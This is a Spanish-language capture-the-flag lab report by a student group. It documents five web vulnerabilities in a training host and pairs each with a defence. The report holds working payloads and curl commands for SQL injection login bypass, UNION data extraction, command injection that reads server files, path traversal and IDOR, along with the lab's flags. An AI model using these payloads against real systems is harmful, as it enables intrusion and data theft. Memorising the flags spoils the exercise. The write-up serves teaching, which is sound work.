# Informe — Laboratorio 07 · Explotación

**Grupo:** 03

**Integrantes:**
- Host Efrain — hostefrain
- Federico Sanchez — Fedesan14
- Lohana Rumis — Lohana-Rumis
- Elian Enria — elian-enria-id

**Fecha:** 31/10/2026

## 0. Declaración de uso de IA

Se utilizó ChatGPT como herramienta de asistencia para comprender las vulnerabilidades, interpretar los resultados de los comandos y organizar la documentación. Las pruebas de explotación y la verificación de las flags se realizaron en el entorno del laboratorio.

## 1. Flags capturadas

Estado obtenido mediante `./ctf status 07`:

```text
R1 ✓ SQLi - bypass de autenticacion
R2 ✓ SQLi - extraccion de datos con UNION
R3 ✓ Inyeccion de comandos (RCE)
R4 ✓ Path traversal
R5 ✓ IDOR

Progreso: 5/5 (100%)
```

Flags verificadas:

- R1: `FLAG{sqli_auth_bypass}`
- R2: `FLAG{sqli_union_dump}`
- R3: `FLAG{command_injection_rce}`
- R4: `FLAG{cpath_traversal_lfi}`
- R5: `FLAG{idor_broken_access}`


## 2. Tabla de explotación

| Vuln | Payload usado | Consulta/comando/ruta resultante | Impacto | Defensa concreta |
|---|---|---|---|---|
| SQLi auth (R1) | `user=admin' --` y contraseña arbitraria. | La comilla cierra el valor del usuario y `--` comenta el resto de la consulta SQL. | Acceso al panel de administración sin conocer la contraseña. | Consultas parametrizadas y almacenamiento seguro de contraseñas mediante hashes. |
| SQLi UNION (R2) | `%' UNION SELECT clave,valor FROM secrets-- ` | Se combina la consulta original con `SELECT clave,valor FROM secrets`. | Extracción de información confidencial de la base de datos. | Consultas parametrizadas, validación de entradas y principio de mínimo privilegio. |
| Command injection (R3) | `host=127.0.0.1; id` y `host=127.0.0.1; cat /app/flags/cmdi.txt` | El servidor ejecutó `ping -c1 127.0.0.1; id` y luego `cat /app/flags/cmdi.txt`. | Ejecución remota de comandos con privilegios de root y lectura de archivos del servidor. | Evitar construir comandos mediante concatenación de entradas. Utilizar APIs seguras, listas permitidas de valores y ejecutar el servicio con privilegios mínimos. |
| Path Traversal (R4) | `archivo=../../app/flags/lfi.txt` | El servidor intentó abrir `/app/public/../../app/flags/lfi.txt` y devolvió el contenido de `lfi.txt`. | Lectura de archivos fuera del directorio público y exposición de información sensible. | Canonicalizar y validar las rutas, restringir el acceso al directorio permitido y evitar que el usuario controle rutas arbitrarias. |
| IDOR (R5) | `id=1` en `/perfil` | El servidor devolvió el perfil del administrador, incluyendo su nota privada y la flag. | Acceso no autorizado a información de otro usuario. | Obtener la identidad desde la sesión autenticada y verificar en el servidor que el usuario tenga permiso para acceder al recurso solicitado. |

## 3. Preguntas de análisis

**P1 — ¿Por qué funciona el bypass (con la query)?**

El payload `admin' --` funciona porque la comilla simple cierra el valor del usuario dentro de la consulta SQL. Luego, `--` convierte el resto de la consulta en un comentario, evitando que se ejecute la condición que comprueba la contraseña.

Una representación simplificada de la consulta vulnerable sería:

```sql
SELECT * FROM users
WHERE user = 'admin' -- '
AND pass = 'contraseña';
```

Esta consulta es una representación ilustrativa del comportamiento observado, no una transcripción verificada del código fuente del servidor.

**P2 — ¿Por qué UNION necesita igual número de columnas?**

Las consultas combinadas mediante `UNION` deben devolver la misma cantidad de columnas y sus tipos de datos deben ser compatibles en las posiciones correspondientes.

En este reto, la consulta original devolvía dos columnas (`nombre` y `precio`). Por eso utilizamos:

```sql
UNION SELECT clave, valor FROM secrets
```

Esto permitió obtener información de la tabla `secrets`.

**P3 — ¿Qué sigue después del RCE?**

Después de conseguir ejecución remota de comandos, un atacante podría intentar
mantener persistencia en el sistema, obtener mayores privilegios, acceder a
otros recursos internos, extraer información confidencial o comprometer otros
servicios. En este laboratorio comprobamos que el proceso se ejecutaba como
root, lo que aumenta considerablemente el impacto de la vulnerabilidad.

**P4 — ¿Por qué parametrizar evita la SQLi?**

La parametrización evita la inyección SQL porque separa las instrucciones de la consulta SQL de los datos proporcionados por el usuario. En lugar de concatenar directamente los valores ingresados dentro de una consulta, se utilizan parámetros que la base de datos interpreta exclusivamente como datos y no como parte del código SQL.

De esta manera, aunque un atacante ingrese caracteres especiales o instrucciones SQL maliciosas, estos no pueden modificar la estructura original de la consulta. Esto permite prevenir ataques como el bypass de autenticación y la extracción no autorizada de información mediante SQL Injection.

**P5 — ¿Dónde va el control de acceso (IDOR)?**

Porque el cliente puede modificar fácilmente los parámetros de una solicitud HTTP.
Si el servidor confía en el ID recibido sin comprobar los permisos, un usuario puede
acceder a información de otras cuentas, como ocurrió en el reto R5 al cambiar
`id=3` por `id=1`. La autorización debe verificarse siempre en el servidor,
comprobando que el usuario autenticado tenga permiso para acceder al recurso.

## 4. Bitácora de comandos

**R1 — Bypass de autenticación:**

```bash
curl -i -X POST http://phantomcorp/login \
  --data-urlencode "user=admin' --" \
  --data-urlencode "pass=cualquiercosa"
```

Resultado: acceso al panel de administración y obtención de `FLAG{sqli_auth_bypass}`.

**R2 — Extracción mediante UNION:**

```bash
curl -iG "http://phantomcorp/buscar" \
  --data-urlencode "q=%' UNION SELECT clave,valor FROM secrets-- "
```

Resultado: extracción de `FLAG{sqli_union_dump}` desde la tabla `secrets`.

**R3 — Command Injection:**

```bash
curl -iG "http://phantomcorp/herramientas/ping" \
  --data-urlencode "host=127.0.0.1; id"

curl -iG "http://phantomcorp/herramientas/ping" \
  --data-urlencode "host=127.0.0.1; ls -la /app/flags"

curl -iG "http://phantomcorp/herramientas/ping" \
  --data-urlencode "host=127.0.0.1; cat /app/flags/cmdi.txt"
```

Resultado: ejecución de comandos como root y obtención de `FLAG{command_injection_rce}`.

**R4 — Path traversal:**

```bash
curl -iG "http://phantomcorp/descargar" \
  --data-urlencode "archivo=archivo.txt"

curl -iG "http://phantomcorp/descargar" \
  --data-urlencode "archivo=../../app/flags/lfi.txt"
```

Resultado: FLAG{path_traversal_lfi}.

**R5 — IDOR:**

```bash
curl -iG "http://phantomcorp/perfil" \
  --data-urlencode "id=3"

curl -iG "http://phantomcorp/perfil" \
  --data-urlencode "id=1"
```

Resultado: FLAG{idor_broken_access}.